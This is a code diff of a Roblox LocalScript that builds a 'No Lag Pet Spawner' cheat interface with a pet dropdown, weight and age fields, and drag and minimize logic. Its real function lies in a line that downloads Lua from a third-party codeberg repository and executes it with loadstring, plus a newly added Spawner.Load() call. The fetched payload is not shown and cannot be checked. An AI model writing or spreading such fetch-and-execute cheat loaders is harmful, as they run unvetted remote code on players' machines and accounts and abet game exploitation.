@@ -1,9 +1,12 @@
 -- LocalScript in StarterGui
-local Players         = game:GetService("Players")
-local TweenService    = game:GetService("TweenService")
-local UserInputService= game:GetService("UserInputService")
-local player          = Players.LocalPlayer
-local Spawner         = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
+local Players          = game:GetService("Players")
+local TweenService     = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local player           = Players.LocalPlayer
+
+-- new spawner loader
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
+Spawner.Load()
 
 -- parent ScreenGui
 local gui = Instance.new("ScreenGui")
@@ -13,7 +16,7 @@ gui.Parent = player:WaitForChild("PlayerGui")
 -- main window (start hidden for fade-in)
 local window = Instance.new("Frame", gui)
 window.Name             = "Window"
-window.Size             = UDim2.new(0, 360, 0, 0)  -- start at 0 height
+window.Size             = UDim2.new(0, 360, 0, 0)
 window.Position         = UDim2.new(0.5, -180, 0.5, -150)
 window.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 window.BorderSizePixel  = 0
@@ -24,7 +27,7 @@ local origSize      = UDim2.new(0,360,0,300)
 local minimizedSize = UDim2.new(0,360,0,36)
 local isMinimized   = false
 
--- Title bar
+-- TitleBar (draggable)
 local titleBar = Instance.new("Frame", window)
 titleBar.Name               = "TitleBar"
 titleBar.Size               = UDim2.new(1,0,0,36)
@@ -34,7 +37,6 @@ titleBar.BorderSizePixel    = 0
 Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0,8)
 titleBar.ZIndex = 2
 
--- Centered title
 local title = Instance.new("TextLabel", titleBar)
 title.Name                   = "Title"
 title.Text                   = "No Lag Pet Spawner V1.2"
@@ -49,7 +51,6 @@ title.TextXAlignment         = Enum.TextXAlignment.Center
 title.TextYAlignment         = Enum.TextYAlignment.Center
 title.ZIndex = 2
 
--- Minimize button
 local minBtn = Instance.new("TextButton", titleBar)
 minBtn.Name                   = "Minimize"
 minBtn.Text                   = "—"
@@ -61,43 +62,41 @@ minBtn.Size                   = UDim2.new(0,36,0,36)
 minBtn.Position               = UDim2.new(1,-40,0,0)
 minBtn.ZIndex                 = 2
 
--- make window draggable by titleBar
-local dragging, dragInput, dragStart, startPos
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos  = window.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
+-- drag logic
+do
+    local dragging, dragStart, startPos
+    titleBar.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = inp.Position
+            startPos  = window.Position
+            inp.Changed:Connect(function()
+                if inp.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    titleBar.InputChanged:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseMovement then
+            if dragging then
+                local delta = inp.Position - dragStart
+                window.Position = UDim2.new(
+                    startPos.X.Scale, startPos.X.Offset + delta.X,
+                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                )
             end
-        end)
-    end
-end)
-titleBar.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(
-            startPos.X.Scale, startPos.X.Offset + delta.X,
-            startPos.Y.Scale, startPos.Y.Offset + delta.Y
-        )
-    end
-end)
+        end
+    end)
+end
 
--- Pet Spawner tab
+-- Pet tab
 local tabBar = Instance.new("Frame", window)
 tabBar.Name                   = "TabBar"
 tabBar.Size                   = UDim2.new(1,-16,0,32)
 tabBar.Position               = UDim2.new(0,8,0,44)
 tabBar.BackgroundTransparency = 1
 tabBar.ZIndex                 = 1
-
 local petBtn = Instance.new("TextButton", tabBar)
 petBtn.Name             = "PetTab"
 petBtn.Text             = "Pet Spawner"
@@ -109,7 +108,7 @@ petBtn.BorderSizePixel  = 0
 petBtn.Size             = UDim2.new(1,0,1,0)
 Instance.new("UICorner", petBtn).CornerRadius = UDim.new(0,6)
 
--- container for pet controls
+-- container
 local content = Instance.new("Frame", window)
 content.Name             = "PetContent"
 content.Size             = UDim2.new(1,-16,1,-100)
@@ -117,85 +116,63 @@ content.Position         = UDim2.new(0,8,0,84)
 content.BackgroundColor3 = Color3.fromRGB(30,30,30)
 Instance.new("UICorner", content).CornerRadius = UDim.new(0,6)
 content.ZIndex           = 1
-
 local uiList = Instance.new("UIListLayout", content)
 uiList.Padding             = UDim.new(0,8)
 uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 uiList.VerticalAlignment   = Enum.VerticalAlignment.Top
 uiList.SortOrder           = Enum.SortOrder.LayoutOrder
 
--- Pet Name dropdown
+-- Pet dropdown
 local petList = {"Mimic Octopus","Raccoon","Disco Bee","Dragonfly","Queen Bee","Red Fox","Seal"}
-local dropdownFrame = Instance.new("Frame", content)
-dropdownFrame.Size              = UDim2.new(1,-20,0,36)
-dropdownFrame.BackgroundTransparency = 1
-dropdownFrame.ZIndex            = 2
-
-local lblName = Instance.new("TextLabel", dropdownFrame)
-lblName.Text = "Pet Name:"; lblName.Font = Enum.Font.SourceSans; lblName.TextSize = 14
-lblName.TextColor3 = Color3.new(1,1,1); lblName.BackgroundTransparency = 1
-lblName.Size = UDim2.new(0.4,0,1,0); lblName.ZIndex = 2
-
-local dropBtn = Instance.new("TextButton", dropdownFrame)
-dropBtn.Text = petList[1]; dropBtn.Font = Enum.Font.SourceSans; dropBtn.TextSize = 14
-dropBtn.TextColor3 = Color3.new(1,1,1); dropBtn.BackgroundColor3 = Color3.fromRGB(45,45,45)
-dropBtn.BorderSizePixel = 0; dropBtn.Size = UDim2.new(0.55,0,1,0); dropBtn.Position = UDim2.new(0.45,0,0,0)
+local df = Instance.new("Frame", content)
+df.Size, df.BackgroundTransparency = UDim2.new(1,-20,0,36), 1
+df.ZIndex = 2
+local lbl = Instance.new("TextLabel", df)
+lbl.Text, lbl.Font, lbl.TextSize = "Pet Name:", Enum.Font.SourceSans, 14
+lbl.TextColor3, lbl.BackgroundTransparency = Color3.new(1,1,1), 1
+lbl.Size, lbl.ZIndex = UDim2.new(0.4,0,1,0), 2
+local dropBtn = Instance.new("TextButton", df)
+dropBtn.Text, dropBtn.Font, dropBtn.TextSize = petList[1], Enum.Font.SourceSans, 14
+dropBtn.TextColor3, dropBtn.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(45,45,45)
+dropBtn.BorderSizePixel, dropBtn.Size = 0, UDim2.new(0.55,0,1,0)
+dropBtn.Position, dropBtn.ZIndex = UDim2.new(0.45,0,0,0), 2
 Instance.new("UICorner", dropBtn).CornerRadius = UDim.new(0,4)
-dropBtn.ZIndex = 2
-
-local opts = Instance.new("Frame", dropdownFrame)
-opts.Visible           = false
-opts.BackgroundColor3  = Color3.fromRGB(45,45,45)
-opts.BorderSizePixel   = 0
-opts.Position          = UDim2.new(0.45,0,1,2)
-opts.Size              = UDim2.new(0.55,0,0,#petList*36)
+local opts = Instance.new("Frame", df)
+opts.Visible, opts.BackgroundColor3 = false, Color3.fromRGB(45,45,45)
+opts.BorderSizePixel, opts.Position = 0, UDim2.new(0.45,0,1,2)
+opts.Size, opts.ZIndex = UDim2.new(0.55,0,0,#petList*36), 2
 Instance.new("UICorner", opts).CornerRadius = UDim.new(0,4)
-opts.ZIndex            = 2
-
 local optsLayout = Instance.new("UIListLayout", opts)
-optsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-optsLayout.Padding   = UDim.new(0,2)
-
+optsLayout.SortOrder, optsLayout.Padding = Enum.SortOrder.LayoutOrder, UDim.new(0,2)
 for i,v in ipairs(petList) do
-    local entry = Instance.new("TextButton", opts)
-    entry.Text             = v
-    entry.Font             = Enum.Font.SourceSans
-    entry.TextSize         = 14
-    entry.TextColor3       = Color3.new(1,1,1)
-    entry.BackgroundColor3 = Color3.fromRGB(55,55,55)
-    entry.BorderSizePixel  = 0
-    entry.Size             = UDim2.new(1,0,0,36)
-    entry.LayoutOrder      = i
-    Instance.new("UICorner", entry).CornerRadius = UDim.new(0,4)
-    entry.ZIndex           = 2
-    entry.MouseButton1Click:Connect(function()
+    local e = Instance.new("TextButton", opts)
+    e.Text, e.Font, e.TextSize = v, Enum.Font.SourceSans, 14
+    e.TextColor3, e.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(55,55,55)
+    e.BorderSizePixel, e.Size, e.LayoutOrder = 0, UDim2.new(1,0,0,36), i
+    Instance.new("UICorner", e).CornerRadius = UDim.new(0,4)
+    e.ZIndex = 2
+    e.MouseButton1Click:Connect(function()
         dropBtn.Text = v
-        opts.Visible  = false
+        opts.Visible = false
     end)
 end
 dropBtn.MouseButton1Click:Connect(function() opts.Visible = not opts.Visible end)
 
--- helper for weight & age
+-- numeric fields
 local function makeField(labelText, placeholder)
-    local frame = Instance.new("Frame", content)
-    frame.Size = UDim2.new(1,-20,0,36); frame.BackgroundTransparency = 1; frame.ZIndex = 1
-    local lbl = Instance.new("TextLabel", frame)
-    lbl.Text = labelText; lbl.Font = Enum.Font.SourceSans; lbl.TextSize = 14
-    lbl.TextColor3 = Color3.new(1,1,1); lbl.BackgroundTransparency = 1
-    lbl.Size = UDim2.new(0.4,0,1,0); lbl.ZIndex = 1
-    local box = Instance.new("TextBox", frame)
-    box.PlaceholderText  = placeholder or ""
-    box.Text             = ""      -- ensure no default "TextBox"
-    box.Font             = Enum.Font.SourceSans
-    box.TextSize         = 14
-    box.TextColor3       = Color3.new(1,1,1)
-    box.BackgroundColor3 = Color3.fromRGB(45,45,45)
-    box.BorderSizePixel  = 0
-    box.Size             = UDim2.new(0.55,0,1,0)
-    box.Position         = UDim2.new(0.45,0,0,0)
-    Instance.new("UICorner", box).CornerRadius = UDim.new(0,4)
-    box.ZIndex = 1
-    return box
+    local f = Instance.new("Frame", content)
+    f.Size, f.BackgroundTransparency, f.ZIndex = UDim2.new(1,-20,0,36), 1, 1
+    local l = Instance.new("TextLabel", f)
+    l.Text, l.Font, l.TextSize = labelText, Enum.Font.SourceSans, 14
+    l.TextColor3, l.BackgroundTransparency = Color3.new(1,1,1), 1
+    l.Size, l.ZIndex = UDim2.new(0.4,0,1,0), 1
+    local b = Instance.new("TextBox", f)
+    b.PlaceholderText, b.Text = placeholder or "", ""
+    b.Font, b.TextSize, b.TextColor3 = Enum.Font.SourceSans, 14, Color3.new(1,1,1)
+    b.BackgroundColor3, b.BorderSizePixel = Color3.fromRGB(45,45,45), 0
+    b.Size, b.Position, b.ZIndex = UDim2.new(0.55,0,1,0), UDim2.new(0.45,0,0,0), 1
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
+    return b
 end
 
 local kgBox  = makeField("Weight (KG):", "e.g. 1")
@@ -203,33 +180,27 @@ local ageBox = makeField("Age:",         "e.g. 2")
 
 -- Spawn button
 local spawnBtn = Instance.new("TextButton", content)
-spawnBtn.Text             = "Spawn"
-spawnBtn.Font             = Enum.Font.SourceSansBold
-spawnBtn.TextSize         = 18
-spawnBtn.TextColor3       = Color3.new(1,1,1)
-spawnBtn.BackgroundColor3 = Color3.fromRGB(60,60,60)
-spawnBtn.BorderSizePixel  = 0
-spawnBtn.Size             = UDim2.new(0.5,0,0,36)
-spawnBtn.Position         = UDim2.new(0.25,0,0,0)
+spawnBtn.Text, spawnBtn.Font, spawnBtn.TextSize = "Spawn", Enum.Font.SourceSansBold, 18
+spawnBtn.TextColor3, spawnBtn.BackgroundColor3 = Color3.new(1,1,1), Color3.fromRGB(60,60,60)
+spawnBtn.BorderSizePixel, spawnBtn.Size = 0, UDim2.new(0.5,0,0,36)
+spawnBtn.Position, spawnBtn.ZIndex = UDim2.new(0.25,0,0,0), 1
 Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,6)
-spawnBtn.ZIndex           = 1
-
 spawnBtn.MouseButton1Click:Connect(function()
     local pet = dropBtn.Text
-    local kg  = tonumber(kgBox.Text) or 1
+    local kg  = tonumber(kgBox.Text)  or 1
     local age = tonumber(ageBox.Text) or 1
-    if pet and pet ~= "" then
+    if pet ~= "" then
         Spawner.SpawnPet(pet, kg, age)
     end
 end)
 
--- FADE-IN on start
+-- fade-in
 TweenService:Create(window, TweenInfo.new(0.4), {Size = origSize}):Play()
 
--- MINIMIZE with animation and placeholders preserved
+-- fixed minimize
 minBtn.MouseButton1Click:Connect(function()
     isMinimized = not isMinimized
     tabBar.Visible, content.Visible = not isMinimized, not isMinimized
     local target = isMinimized and minimizedSize or origSize
-    TweenService:Create(window, TweenInfo.new(0.3), {Size = target}):Play()
+    TweenService:Create(window, TweenInfo.new(0.25), {Size = target}):Play()
 end)
